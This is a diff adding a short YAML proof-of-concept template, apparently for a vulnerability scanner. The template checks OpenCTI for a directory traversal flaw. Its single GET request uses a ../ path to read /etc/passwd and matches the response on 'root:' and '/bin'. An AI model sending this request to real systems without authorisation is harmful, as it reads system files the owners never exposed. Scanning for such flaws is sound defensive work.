@@ -1,0 +1,17 @@
+id: poc-yaml-opencti-directory-traversal
+info:
+  name: OpenCTI 目录遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: OpenCTI
+  osprey-id: vb_2020_0043
+requests:
+- method: GET
+  path: /static/css/../../../../../../../../etc/passwd
+  expression: 'status_code == 200 && contains(body, "root:") && !contains(body, "<")
+    && contains(body, "/bin")
+
+    '
+variables: {}
+transport: http
